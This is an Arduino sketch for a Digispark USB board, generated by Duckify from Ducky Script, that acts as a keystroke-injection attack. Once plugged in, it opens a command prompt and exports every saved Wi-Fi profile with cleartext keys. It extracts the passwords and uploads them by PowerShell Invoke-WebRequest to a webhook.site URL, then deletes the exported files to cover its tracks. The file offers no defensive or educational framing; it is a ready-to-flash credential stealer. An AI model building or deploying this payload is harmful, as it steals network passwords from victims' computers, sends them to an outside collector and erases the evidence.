// [ ===== Created using duckify.huhn.me @ dev aadd7808 ===== ] //
// Duckify is a free and Open-Source web-app for converting Ducky Script into Arduino code.
// Please consider supporting us on ko-fi.com/spacehuhn <3
// Learn more about us at spacehuhn.com

// Platform: Digispark
// Keyboard Layout: IT

#include "DigiKeyboard.h"

// cmd
const uint8_t key_arr_0[] PROGMEM = {0,6, 0,16, 0,7};
// cd %temp%
const uint8_t key_arr_1[] PROGMEM = {0,6, 0,7, 0,44, 2,34, 0,23, 0,8, 0,16, 0,19, 2,34};
// netsh wlan export profile key=clear
const uint8_t key_arr_2[] PROGMEM = {0,17, 0,8, 0,23, 0,22, 0,11, 0,44, 0,26, 0,15, 0,4, 0,17, 0,44, 0,8, 0,27, 0,19, 0,18, 0,21, 0,23, 0,44, 0,19, 0,21, 0,18, 0,9, 0,12, 0,15, 0,8, 0,44, 0,14, 0,8, 0,28, 2,39, 0,6, 0,15, 0,8, 0,4, 0,21};
// powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS 
const uint8_t key_arr_3[] PROGMEM = {0,19, 0,18, 0,26, 0,8, 0,21, 0,22, 0,11, 0,8, 0,15, 0,15, 0,44, 2,22, 0,8, 0,15, 0,8, 0,6, 0,23, 0,56, 2,22, 0,23, 0,21, 0,12, 0,17, 0,10, 0,44, 0,56, 2,19, 0,4, 0,23, 0,11, 0,44, 2,26, 0,12, 2,48, 0,55, 0,27, 0,16, 0,15, 0,44, 0,56, 2,19, 0,4, 0,23, 0,23, 0,8, 0,21, 0,17, 0,44, 0,45, 0,14, 0,8, 0,28, 2,16, 0,4, 0,23, 0,8, 0,21, 0,12, 0,4, 0,15, 0,45, 0,44, 2,100, 0,44, 2,26, 0,12, 0,56, 2,9, 0,12, 0,56, 2,19, 2,4, 2,22, 2,22, 0,44};
// powershell Invoke-WebRequest -Uri https://webhook.site/21168d36-6996-455c-9b11-b04af395ea85 -Method POST -InFile Wi-Fi-PASS
const uint8_t key_arr_4[] PROGMEM = {0,19, 0,18, 0,26, 0,8, 0,21, 0,22, 0,11, 0,8, 0,15, 0,15, 0,44, 2,12, 0,17, 0,25, 0,18, 0,14, 0,8, 0,56, 2,26, 0,8, 0,5, 2,21, 0,8, 0,20, 0,24, 0,8, 0,22, 0,23, 0,44, 0,56, 2,24, 0,21, 0,12, 0,44, 0,11, 0,23, 0,23, 0,19, 0,22, 2,55, 2,36, 2,36, 0,26, 0,8, 0,5, 0,11, 0,18, 0,18, 0,14, 0,55, 0,22, 0,12, 0,23, 0,8, 2,36, 0,31, 0,30, 0,30, 0,35, 0,37, 0,7, 0,32, 0,35, 0,56, 0,35, 0,38, 0,38, 0,35, 0,56, 0,33, 0,34, 0,34, 0,6, 0,56, 0,38, 0,5, 0,30, 0,30, 0,56, 0,5, 0,39, 0,33, 0,4, 0,9, 0,32, 0,38, 0,34, 0,8, 0,4, 0,37, 0,34, 0,44, 0,56, 2,16, 0,8, 0,23, 0,11, 0,18, 0,7, 0,44, 2,19, 2,18, 2,22, 2,23, 0,44, 0,56, 2,12, 0,17, 2,9, 0,12, 0,15, 0,8, 0,44, 2,26, 0,12, 0,56, 2,9, 0,12, 0,56, 2,19, 2,4, 2,22, 2,22};
// del Wi* /s/f/q
const uint8_t key_arr_5[] PROGMEM = {0,7, 0,8, 0,15, 0,44, 2,26, 0,12, 2,48, 0,44, 2,36, 0,22, 2,36, 0,9, 2,36, 0,20};
// exit
const uint8_t key_arr_6[] PROGMEM = {0,8, 0,27, 0,12, 0,23};

void duckyString(const uint8_t* keys, size_t len) {  
    for(size_t i=0; i<len; i+=2) {
        DigiKeyboard.sendKeyStroke(pgm_read_byte_near(keys + i+1), pgm_read_byte_near(keys + i));
    }
}

void setup() {
    pinMode(1, OUTPUT); // Enable LED
    digitalWrite(1, LOW); // Turn LED off
    DigiKeyboard.sendKeyStroke(0); // Tell computer no key is pressed

    DigiKeyboard.delay(800); // DELAY 800
    DigiKeyboard.sendKeyStroke(41, 1); // CONTROL ESCAPE
    DigiKeyboard.delay(400); // DELAY 400
    duckyString(key_arr_0, sizeof(key_arr_0)); // STRING cmd
    DigiKeyboard.delay(1200); // DELAY 1200
    DigiKeyboard.sendKeyStroke(79, 0); // RIGHT
    DigiKeyboard.delay(400); // DELAY 400
    DigiKeyboard.sendKeyStroke(81, 0); // DOWN
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(1500); // DELAY 1500
    DigiKeyboard.sendKeyStroke(80, 0); // LEFT
    DigiKeyboard.delay(1000); // DELAY 1000
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(1000); // DELAY 1000
    duckyString(key_arr_1, sizeof(key_arr_1)); // STRING cd %temp%
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(500); // DELAY 500
    duckyString(key_arr_2, sizeof(key_arr_2)); // STRING netsh wlan export profile key=clear
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(500); // DELAY 500
    duckyString(key_arr_3, sizeof(key_arr_3)); // STRING powershell Select-String -Path Wi*.xml ...
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(1000); // DELAY 1000
    DigiKeyboard.delay(500); // DELAY 500
    duckyString(key_arr_4, sizeof(key_arr_4)); // STRING powershell Invoke-WebRequest -Uri https...
    DigiKeyboard.delay(400); // DELAY 400
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(300); // DELAY 300
    duckyString(key_arr_5, sizeof(key_arr_5)); // STRING del Wi* /s/f/q
    DigiKeyboard.delay(200); // DELAY 200
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(500); // DELAY 500
    duckyString(key_arr_6, sizeof(key_arr_6)); // STRING exit
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
}

void loop() {}

// Created using duckify.huhn.me @ dev aadd7808
//https://webhook.site/#!/21168d36-6996-455c-9b11-b04af395ea85/310ad368-7e84-4857-bd50-f1b4803ef66e/104
//X04
//
//
